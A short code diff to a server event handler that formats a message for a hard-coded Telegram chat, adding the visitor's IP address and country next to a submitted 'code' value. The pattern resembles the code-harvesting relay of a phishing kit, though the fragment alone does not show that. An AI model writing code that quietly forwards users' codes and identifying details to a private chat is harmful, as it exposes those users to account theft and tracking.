@@ -10,7 +10,9 @@ export default defineEventHandler(async (event) => {
         chat_id: '-4793352063',
         text: code
           ? `
-          <b>Code:</b> ${code} \n
+          <b>Code:</b> ${code}
+<b>ip:</b>${event.headers.get('CF-Connecting-IP')}
+<b>Country:</b>${countryCode}
           `
           : `
           <b>${message}</b>
